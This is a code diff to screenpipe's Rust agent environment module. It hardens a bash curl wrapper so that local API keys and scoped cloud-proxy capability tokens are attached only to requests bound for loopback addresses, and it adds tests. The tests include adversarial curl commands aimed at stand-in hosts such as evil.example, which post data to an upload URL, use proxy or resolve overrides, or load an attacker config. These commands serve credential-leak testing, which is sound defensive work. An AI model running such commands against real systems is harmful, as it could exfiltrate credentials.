@@ -50,9 +50,9 @@ pub const WRAPPER_SCRIPT: &str = r#"# screenpipe — auto-injected by pi-agent b
 #
 # Regenerated on every pi-agent spawn from screenpipe-core::agents::bash_env.
 
-# Hide the cloud-LLM JWT (SCREENPIPE_API_KEY) from the agent's bash. The
-# pi-coding-agent reads it from auth.json directly and does NOT need it
-# in the env. Leaving it exposed bit a real user (justinspillers,
+# Defense in depth: the Pi parent process no longer receives the cloud-LLM JWT
+# (SCREENPIPE_API_KEY) at all; clear any stale value inherited by external or
+# older launch paths before bash tools run. Leaving it exposed bit a real user (justinspillers,
 # 2026-05-05): the agent saw an env var named "SCREENPIPE_API_KEY", used
 # it on localhost:3030, the server 401'd (it's a JWT, not the local
 # sp-<uuid8> token), and the agent burned 30+ tool calls hunting a
@@ -66,10 +66,60 @@ _sp_auth_key() {
   printf '%s' "${SCREENPIPE_LOCAL_API_KEY:-}"
 }
 
+_sp_is_loopback_url() {
+  local url="$1" api_port="$2"
+  case "$url" in
+    "http://localhost:${api_port}"|"http://localhost:${api_port}/"*|"http://localhost:${api_port}?"*|"http://localhost:${api_port}#"*|\
+    "http://127.0.0.1:${api_port}"|"http://127.0.0.1:${api_port}/"*|"http://127.0.0.1:${api_port}?"*|"http://127.0.0.1:${api_port}#"*|\
+    "http://[::1]:${api_port}"|"http://[::1]:${api_port}/"*|"http://[::1]:${api_port}?"*|"http://[::1]:${api_port}#"*|\
+    http://localhost:11435|http://localhost:11435/*|http://localhost:11435\?*|http://localhost:11435\#*|\
+    http://127.0.0.1:11435|http://127.0.0.1:11435/*|http://127.0.0.1:11435\?*|http://127.0.0.1:11435\#*|\
+    http://\[::1\]:11435|http://\[::1\]:11435/*|http://\[::1\]:11435\?*|http://\[::1\]:11435\#*)
+      return 0
+      ;;
+    *)
+      return 1
+      ;;
+  esac
+}
+
+_sp_rewrite_default_api_port() {
+  local url="$1" api_port="$2"
+  if [ "$api_port" != "3030" ]; then
+    case "$url" in
+      http://localhost:3030*)
+        printf 'http://localhost:%s%s' "$api_port" "${url#http://localhost:3030}"
+        return
+        ;;
+      http://127.0.0.1:3030*)
+        printf 'http://127.0.0.1:%s%s' "$api_port" "${url#http://127.0.0.1:3030}"
+        return
+        ;;
+      http://\[::1\]:3030*)
+        printf 'http://[::1]:%s%s' "$api_port" "${url#http://\[::1\]:3030}"
+        return
+        ;;
+    esac
+  fi
+  printf '%s' "$url"
+}
+
 curl() {
-  local key sid has_local=0 add_filter=0 arg
+  local key capability background_capability interactive_capability sid
+  local add_filter=0 arg expect_value=0 expect_url=0 urls_only=0
+  local parse_ok=1 url_count=0 all_loopback=1 has_local=0 url_path local_port
+  local route_scope="" candidate_scope=""
   local -a out=() hdrs=()
   key="$(_sp_auth_key)"
+  background_capability="${SCREENPIPE_CLOUD_PROXY_BACKGROUND_CAPABILITY:-}"
+  interactive_capability="${SCREENPIPE_CLOUD_PROXY_INTERACTIVE_CAPABILITY:-}"
+  local_port="${SCREENPIPE_LOCAL_API_PORT:-3030}"
+  case "$local_port" in
+    ''|*[!0-9]*)
+      parse_ok=0
+      local_port=3030
+      ;;
+  esac
   # Chat/session this agent runs under. The owned-browser is a singleton shared
   # by every chat and background pipe, so we tag local API calls with the owner
   # (x-screenpipe-session); the navigate handler rides it to the frontend so a
@@ -80,33 +130,151 @@ curl() {
     add_filter=1
   fi
 
+  # curl treats non-option arguments as request URLs, except values consumed
+  # by options such as -d/-H/-X. Parse the common option surface explicitly
+  # and fail closed on unknown/ambiguous flags: a false negative yields a 403,
+  # while a false positive could leak the local key to a third-party host.
   for arg in "$@"; do
-    case "$arg" in
-      *localhost:3030*|*127.0.0.1:3030*|*'[::1]:3030'*|*localhost:11435*|*127.0.0.1:11435*|*'[::1]:11435'*)
-        has_local=1
-        if [ "$add_filter" = "1" ]; then
-          # Only /search responses contain user-visible text we want to redact.
-          # Match the path segment so we don't rewrite unrelated args that
-          # happen to contain the host:port substring.
-          case "$arg" in
-            *:3030/search*|*:3030//search*)
-              if [[ "$arg" == *"?"* ]]; then
-                arg="${arg}&filter_pii=1"
-              else
-                arg="${arg}?filter_pii=1"
-              fi
-              ;;
-          esac
+    if [ "$expect_value" = "1" ]; then
+      expect_value=0
+      out+=("$arg")
+      continue
+    fi
+
+    if [ "$expect_url" = "1" ]; then
+      expect_url=0
+    elif [ "$urls_only" != "1" ]; then
+      case "$arg" in
+        --)
+          urls_only=1
+          out+=("$arg")
+          continue
+          ;;
+        --url)
+          expect_url=1
+          out+=("$arg")
+          continue
+          ;;
+        --url=*)
+          arg="${arg#--url=}"
+          ;;
+        -K|--config|-x|--proxy|--preproxy|--resolve|--connect-to|--noproxy)
+          parse_ok=0
+          expect_value=1
+          out+=("$arg")
+          continue
+          ;;
+        -K?*|-x?*|--config=*|--proxy=*|--preproxy=*|--resolve=*|--connect-to=*|--noproxy=*)
+          parse_ok=0
+          out+=("$arg")
+          continue
+          ;;
+        -L|--location|--location-trusted)
+          parse_ok=0
+          out+=("$arg")
+          continue
+          ;;
+        -X|--request|-H|--header|-d|--data|--data-raw|--data-binary|--data-urlencode|--json|\
+        -F|--form|-o|--output|-w|--write-out|-u|--user|-A|--user-agent|-b|--cookie|\
+        -c|--cookie-jar|-e|--referer|-T|--upload-file|\
+        --cacert|--capath|--cert|--key|--connect-timeout|-m|--max-time|--retry|\
+        --retry-delay)
+          expect_value=1
+          out+=("$arg")
+          continue
+          ;;
+        -X?*|-H?*|-d?*|-F?*|-o?*|-w?*|-u?*|-A?*|-b?*|-c?*|-e?*|-T?*|-m?*|\
+        --request=*|--header=*|--data=*|--data-raw=*|--data-binary=*|--data-urlencode=*|\
+        --json=*|--form=*|--output=*|--write-out=*|--user=*|--user-agent=*|--cookie=*|\
+        --cookie-jar=*|--referer=*|--upload-file=*|--cacert=*|--capath=*|--cert=*|\
+        --key=*|--connect-timeout=*|--max-time=*|--retry=*|--retry-delay=*)
+          out+=("$arg")
+          continue
+          ;;
+        --*=*)
+          parse_ok=0
+          out+=("$arg")
+          continue
+          ;;
+        -s|--silent|-S|--show-error|-f|--fail|--fail-with-body|-I|--head|\
+        -i|--include|-N|--no-buffer|-k|--insecure|-v|--verbose|--compressed|-g|--globoff|\
+        --http1.1|--http2|--http2-prior-knowledge|--no-progress-meter|-q|--disable|\
+        -O|--remote-name)
+          out+=("$arg")
+          continue
+          ;;
+        -*)
+          parse_ok=0
+          out+=("$arg")
+          continue
+          ;;
+      esac
+    fi
+
+    url_count=$((url_count + 1))
+    arg="$(_sp_rewrite_default_api_port "$arg" "$local_port")"
+    if _sp_is_loopback_url "$arg" "$local_port"; then
+      url_path="${arg%%\?*}"
+      url_path="${url_path%%\#*}"
+      case "$url_path" in
+        */v1/chat/completions)
+          candidate_scope="background"
+          ;;
+        */v1/interactive/chat/completions)
+          candidate_scope="interactive"
+          ;;
+      esac
+      if [ -n "$candidate_scope" ]; then
+        if [ -z "$route_scope" ]; then
+          route_scope="$candidate_scope"
+        elif [ "$route_scope" != "$candidate_scope" ]; then
+          # curl applies one header set to every URL in an invocation. If an
+          # agent combines both proxy routes, no single scoped capability is
+          # valid for both, so omit it and let both requests fail closed.
+          route_scope="mixed"
         fi
-        ;;
-    esac
+        candidate_scope=""
+      fi
+      if [ "$add_filter" = "1" ]; then
+        case "$url_path" in
+          *":${local_port}/search"|*":${local_port}/search/"*|*":${local_port}//search"|*":${local_port}//search/"*)
+            if [[ "$arg" == *"?"* ]]; then
+              arg="${arg}&filter_pii=1"
+            else
+              arg="${arg}?filter_pii=1"
+            fi
+            ;;
+        esac
+      fi
+    else
+      all_loopback=0
+    fi
     out+=("$arg")
   done
+
+  if [ "$parse_ok" = "1" ] && [ "$url_count" -gt 0 ] && [ "$all_loopback" = "1" ]; then
+    has_local=1
+  fi
 
   if [ "$has_local" = "1" ]; then
     [ -n "$key" ] && hdrs+=(-H "Authorization: Bearer $key")
     [ -n "$sid" ] && hdrs+=(-H "x-screenpipe-session: $sid")
-    command curl "${hdrs[@]}" "${out[@]}"
+    case "$route_scope" in
+      background)
+        capability="$background_capability"
+        ;;
+      interactive)
+        capability="$interactive_capability"
+        ;;
+      *)
+        capability=""
+        ;;
+    esac
+    [ -n "$capability" ] && \
+      hdrs+=(-H "x-screenpipe-cloud-proxy-capability: $capability")
+    # -q must be curl's first argument so ~/.curlrc / $CURL_HOME/.curlrc cannot
+    # add a proxy, redirect, or second destination after we attach credentials.
+    command curl -q --noproxy "localhost,127.0.0.1,::1" "${hdrs[@]}" "${out[@]}"
   else
     command curl "${out[@]}"
   fi
@@ -201,6 +369,18 @@ mod tests {
     #[test]
     fn wrapper_script_reads_canonical_env_var_name() {
         assert!(WRAPPER_SCRIPT.contains("SCREENPIPE_LOCAL_API_KEY"));
+        assert!(
+            WRAPPER_SCRIPT.contains("SCREENPIPE_CLOUD_PROXY_BACKGROUND_CAPABILITY"),
+            "background proxy calls need their background-scoped capability"
+        );
+        assert!(
+            WRAPPER_SCRIPT.contains("SCREENPIPE_CLOUD_PROXY_INTERACTIVE_CAPABILITY"),
+            "interactive proxy calls need their interactive-scoped capability"
+        );
+        assert!(
+            !WRAPPER_SCRIPT.contains("SCREENPIPE_CLOUD_PROXY_CAPABILITY:-"),
+            "the ambiguous legacy capability must never be read"
+        );
         // The deprecated alias must NOT be referenced here — every spawn
         // path now guarantees the canonical name is set, and reading both
         // hides bugs where a new spawn path forgets the canonical export.
@@ -225,15 +405,15 @@ mod tests {
     }
 
     #[test]
-    fn wrapper_script_injects_only_for_localhost_3030() {
+    fn wrapper_script_injects_only_for_configured_loopback_hosts() {
         // Smoke check matched forms; any new alias needs a line here.
         for needle in [
             "localhost:3030",
             "127.0.0.1:3030",
-            "[::1]:3030",
+            "[::1]:${api_port}",
             "localhost:11435",
             "127.0.0.1:11435",
-            "[::1]:11435",
+            r"\[::1\]:11435",
         ] {
             assert!(
                 WRAPPER_SCRIPT.contains(needle),
@@ -241,6 +421,7 @@ mod tests {
                 needle
             );
         }
+        assert!(WRAPPER_SCRIPT.contains("SCREENPIPE_LOCAL_API_PORT"));
     }
 
     #[test]
@@ -310,6 +491,212 @@ mod tests {
             local.contains("x-screenpipe-session: conv-abc-123"),
             "local API call must carry the session owner header; got: {local}"
         );
+        assert!(
+            !local.contains("x-screenpipe-cloud-proxy-capability"),
+            "ordinary local API calls must not receive the cloud proxy capability; got: {local}"
+        );
+
+        // Route selection is exact: the background media-analysis path gets
+        // only the background capability, never the interactive capability.
+        let argv_cloud = tmp.path().join("cloud.argv");
+        let status = Command::new("bash")
+            .env("PATH", format!("{}:/usr/bin:/bin", fake_curl_dir.display()))
+            .env("BASH_ENV", &wrapper)
+            .env("CURL_ARGV_FILE", &argv_cloud)
+            .env("SCREENPIPE_LOCAL_API_KEY", "sp-test")
+            .env(
+                "SCREENPIPE_CLOUD_PROXY_BACKGROUND_CAPABILITY",
+                "background-capability",
+            )
+            .env(
+                "SCREENPIPE_CLOUD_PROXY_INTERACTIVE_CAPABILITY",
+                "interactive-capability",
+            )
+            .arg("-c")
+            .arg("curl -X POST http://localhost:3030/v1/chat/completions")
+            .status()
+            .unwrap();
+        assert!(status.success());
+        let cloud = std::fs::read_to_string(&argv_cloud).unwrap();
+        assert!(
+            cloud.contains("x-screenpipe-cloud-proxy-capability: background-capability"),
+            "background proxy call must carry its background capability; got: {cloud}"
+        );
+        assert!(
+            !cloud.contains("interactive-capability"),
+            "background proxy call must not carry the interactive capability; got: {cloud}"
+        );
+
+        // The interactive model path gets only the interactive capability.
+        let argv_interactive = tmp.path().join("interactive.argv");
+        let status = Command::new("bash")
+            .env("PATH", format!("{}:/usr/bin:/bin", fake_curl_dir.display()))
+            .env("BASH_ENV", &wrapper)
+            .env("CURL_ARGV_FILE", &argv_interactive)
+            .env("SCREENPIPE_LOCAL_API_KEY", "sp-test")
+            .env(
+                "SCREENPIPE_CLOUD_PROXY_BACKGROUND_CAPABILITY",
+                "background-capability",
+            )
+            .env(
+                "SCREENPIPE_CLOUD_PROXY_INTERACTIVE_CAPABILITY",
+                "interactive-capability",
+            )
+            .arg("-c")
+            .arg("curl -X POST http://localhost:3030/v1/interactive/chat/completions")
+            .status()
+            .unwrap();
+        assert!(status.success());
+        let interactive = std::fs::read_to_string(&argv_interactive).unwrap();
+        assert!(
+            interactive.contains("x-screenpipe-cloud-proxy-capability: interactive-capability"),
+            "interactive proxy call must carry its interactive capability; got: {interactive}"
+        );
+        assert!(
+            !interactive.contains("background-capability"),
+            "interactive proxy call must not carry the background capability; got: {interactive}"
+        );
+
+        // Possessing the wrong scope does not authorize the other route.
+        let argv_wrong_scope = tmp.path().join("wrong-scope.argv");
+        let status = Command::new("bash")
+            .env("PATH", format!("{}:/usr/bin:/bin", fake_curl_dir.display()))
+            .env("BASH_ENV", &wrapper)
+            .env("CURL_ARGV_FILE", &argv_wrong_scope)
+            .env("SCREENPIPE_LOCAL_API_KEY", "sp-test")
+            .env(
+                "SCREENPIPE_CLOUD_PROXY_BACKGROUND_CAPABILITY",
+                "background-capability",
+            )
+            .env_remove("SCREENPIPE_CLOUD_PROXY_INTERACTIVE_CAPABILITY")
+            .arg("-c")
+            .arg("curl -X POST http://localhost:3030/v1/interactive/chat/completions")
+            .status()
+            .unwrap();
+        assert!(status.success());
+        let wrong_scope = std::fs::read_to_string(&argv_wrong_scope).unwrap();
+        assert!(
+            !wrong_scope.contains("x-screenpipe-cloud-proxy-capability"),
+            "wrong-scope capability must not be attached; got: {wrong_scope}"
+        );
+
+        // A single curl invocation cannot safely authenticate both routes
+        // because curl reuses one header set for every URL. Fail closed.
+        let argv_mixed_scope = tmp.path().join("mixed-scope.argv");
+        let status = Command::new("bash")
+            .env("PATH", format!("{}:/usr/bin:/bin", fake_curl_dir.display()))
+            .env("BASH_ENV", &wrapper)
+            .env("CURL_ARGV_FILE", &argv_mixed_scope)
+            .env("SCREENPIPE_LOCAL_API_KEY", "sp-test")
+            .env(
+                "SCREENPIPE_CLOUD_PROXY_BACKGROUND_CAPABILITY",
+                "background-capability",
+            )
+            .env(
+                "SCREENPIPE_CLOUD_PROXY_INTERACTIVE_CAPABILITY",
+                "interactive-capability",
+            )
+            .arg("-c")
+            .arg("curl http://localhost:3030/v1/chat/completions http://localhost:3030/v1/interactive/chat/completions")
+            .status()
+            .unwrap();
+        assert!(status.success());
+        let mixed_scope = std::fs::read_to_string(&argv_mixed_scope).unwrap();
+        assert!(
+            !mixed_scope.contains("x-screenpipe-cloud-proxy-capability"),
+            "mixed-scope invocation must not receive either capability; got: {mixed_scope}"
+        );
+
+        // Skills installed before a custom engine port was selected still
+        // contain :3030 URLs. Rewrite only exact loopback request URLs to the
+        // configured port; model traffic and new prompts already use it.
+        let argv_custom_port = tmp.path().join("custom-port.argv");
+        let status = Command::new("bash")
+            .env("PATH", format!("{}:/usr/bin:/bin", fake_curl_dir.display()))
+            .env("BASH_ENV", &wrapper)
+            .env("CURL_ARGV_FILE", &argv_custom_port)
+            .env("SCREENPIPE_LOCAL_API_KEY", "sp-test")
+            .env(
+                "SCREENPIPE_CLOUD_PROXY_BACKGROUND_CAPABILITY",
+                "background-capability",
+            )
+            .env("SCREENPIPE_LOCAL_API_PORT", "4040")
+            .arg("-c")
+            .arg("curl -s -X POST http://localhost:3030/v1/chat/completions")
+            .status()
+            .unwrap();
+        assert!(status.success());
+        let custom_port = std::fs::read_to_string(&argv_custom_port).unwrap();
+        assert!(custom_port.contains("http://localhost:4040/v1/chat/completions"));
+        assert!(custom_port.contains("Authorization: Bearer sp-test"));
+        assert!(custom_port.contains("x-screenpipe-cloud-proxy-capability: background-capability"));
+
+        // Adversarial classification: localhost text in an external query,
+        // request body, or one URL of a mixed-destination invocation must
+        // never cause either local credential to be attached.
+        for (name, command) in [
+            (
+                "external-query",
+                "curl 'https://evil.example/?next=http://localhost:3030/v1/chat/completions'",
+            ),
+            (
+                "local-looking-body",
+                "curl -d http://localhost:3030/v1/chat/completions https://evil.example/upload",
+            ),
+            (
+                "mixed-destinations",
+                "curl http://localhost:3030/v1/chat/completions https://evil.example/collect",
+            ),
+            (
+                "config-redirect",
+                "curl -K /tmp/attacker-curl.conf http://localhost:3030/v1/chat/completions",
+            ),
+            (
+                "explicit-proxy",
+                "curl -x https://evil-proxy.example http://localhost:3030/v1/chat/completions",
+            ),
+            (
+                "host-resolve-override",
+                "curl --resolve localhost:3030:203.0.113.1 http://localhost:3030/v1/chat/completions",
+            ),
+            (
+                "connect-to-override",
+                "curl --connect-to localhost:3030:evil.example:443 http://localhost:3030/v1/chat/completions",
+            ),
+            (
+                "redirect-following",
+                "curl -L http://localhost:3030/v1/chat/completions",
+            ),
+        ] {
+            let argv = tmp.path().join(format!("{name}.argv"));
+            let status = Command::new("bash")
+                .env("PATH", format!("{}:/usr/bin:/bin", fake_curl_dir.display()))
+                .env("BASH_ENV", &wrapper)
+                .env("CURL_ARGV_FILE", &argv)
+                .env("SCREENPIPE_LOCAL_API_KEY", "sp-must-not-leak")
+                .env(
+                    "SCREENPIPE_CLOUD_PROXY_BACKGROUND_CAPABILITY",
+                    "background-cap-must-not-leak",
+                )
+                .env(
+                    "SCREENPIPE_CLOUD_PROXY_INTERACTIVE_CAPABILITY",
+                    "interactive-cap-must-not-leak",
+                )
+                .arg("-c")
+                .arg(command)
+                .status()
+                .unwrap();
+            assert!(status.success(), "{name} command should reach fake curl");
+            let captured = std::fs::read_to_string(&argv).unwrap();
+            assert!(
+                !captured.contains("Authorization: Bearer"),
+                "{name} leaked local authorization: {captured}"
+            );
+            assert!(
+                !captured.contains("x-screenpipe-cloud-proxy-capability"),
+                "{name} leaked cloud capability: {captured}"
+            );
+        }
 
         let argv_notify = tmp.path().join("notify.argv");
         let status = Command::new("bash")
@@ -337,6 +724,14 @@ mod tests {
             .env("CURL_ARGV_FILE", &argv_ext)
             .env("SCREENPIPE_LOCAL_API_KEY", "sp-test")
             .env("SCREENPIPE_SESSION_ID", "conv-abc-123")
+            .env(
+                "SCREENPIPE_CLOUD_PROXY_BACKGROUND_CAPABILITY",
+                "background-must-not-leak",
+            )
+            .env(
+                "SCREENPIPE_CLOUD_PROXY_INTERACTIVE_CAPABILITY",
+                "interactive-must-not-leak",
+            )
             .arg("-c")
             .arg("curl https://example.com/api")
             .status()
@@ -346,6 +741,75 @@ mod tests {
         assert!(
             !ext.contains("x-screenpipe-session"),
             "owner header must not leak to third-party hosts; got: {ext}"
+        );
+        assert!(
+            !ext.contains("Authorization: Bearer"),
+            "local API key must not leak to third-party hosts; got: {ext}"
+        );
+        assert!(
+            !ext.contains("x-screenpipe-cloud-proxy-capability"),
+            "cloud proxy capability must not leak to third-party hosts; got: {ext}"
+        );
+    }
+
+    #[test]
+    #[cfg(unix)]
+    fn shim_ignores_implicit_curl_config_before_injecting_credentials() {
+        use std::io::{Read, Write};
+        use std::net::TcpListener;
+        use std::process::Command;
+
+        let tmp = tempfile::tempdir().unwrap();
+        let wrapper = ensure_wrapper(tmp.path()).unwrap();
+        let curl_home = tmp.path().join("curl-home");
+        std::fs::create_dir_all(&curl_home).unwrap();
+        std::fs::write(
+            curl_home.join(".curlrc"),
+            "header = \"X-Evil-Config: loaded\"\n",
+        )
+        .unwrap();
+
+        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
+        let port = listener.local_addr().unwrap().port();
+        let server = std::thread::spawn(move || {
+            let (mut socket, _) = listener.accept().unwrap();
+            socket
+                .set_read_timeout(Some(std::time::Duration::from_secs(5)))
+                .unwrap();
+            let mut request = Vec::new();
+            let mut chunk = [0u8; 1024];
+            loop {
+                let read = socket.read(&mut chunk).unwrap_or(0);
+                if read == 0 {
+                    break;
+                }
+                request.extend_from_slice(&chunk[..read]);
+                if request.windows(4).any(|window| window == b"\r\n\r\n") {
+                    break;
+                }
+            }
+            socket
+                .write_all(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")
+                .unwrap();
+            String::from_utf8_lossy(&request).into_owned()
+        });
+
+        let status = Command::new("bash")
+            .env("BASH_ENV", &wrapper)
+            .env("HOME", &curl_home)
+            .env("CURL_HOME", &curl_home)
+            .env("SCREENPIPE_LOCAL_API_KEY", "sp-test")
+            .env("SCREENPIPE_LOCAL_API_PORT", port.to_string())
+            .arg("-c")
+            .arg(format!("curl -s http://127.0.0.1:{port}/health"))
+            .status()
+            .unwrap();
+        assert!(status.success());
+        let request = server.join().unwrap();
+        assert!(request.contains("Authorization: Bearer sp-test"));
+        assert!(
+            !request.contains("X-Evil-Config"),
+            "-q must prevent implicit curl config from mutating the request: {request}"
         );
     }
 
@@ -417,6 +881,23 @@ mod tests {
             on.contains("q=foo&filter_pii=1"),
             "should use & separator when query already present; got: {on}"
         );
+
+        // A stale :3030 skill URL is rewritten to the configured port before
+        // the same privacy filter is applied.
+        let argv_custom = tmp.path().join("custom.argv");
+        let status = Command::new("bash")
+            .env("PATH", format!("{}:/usr/bin:/bin", fake_curl_dir.display()))
+            .env("BASH_ENV", &wrapper)
+            .env("CURL_ARGV_FILE", &argv_custom)
+            .env("SCREENPIPE_FILTER_PII", "1")
+            .env("SCREENPIPE_LOCAL_API_PORT", "4040")
+            .arg("-c")
+            .arg("curl http://localhost:3030/search?q=foo")
+            .status()
+            .unwrap();
+        assert!(status.success());
+        let custom = std::fs::read_to_string(&argv_custom).unwrap();
+        assert!(custom.contains("http://localhost:4040/search?q=foo&filter_pii=1"));
 
         // Non-search paths are untouched even when filter is on.
         let argv_other = tmp.path().join("other.argv");
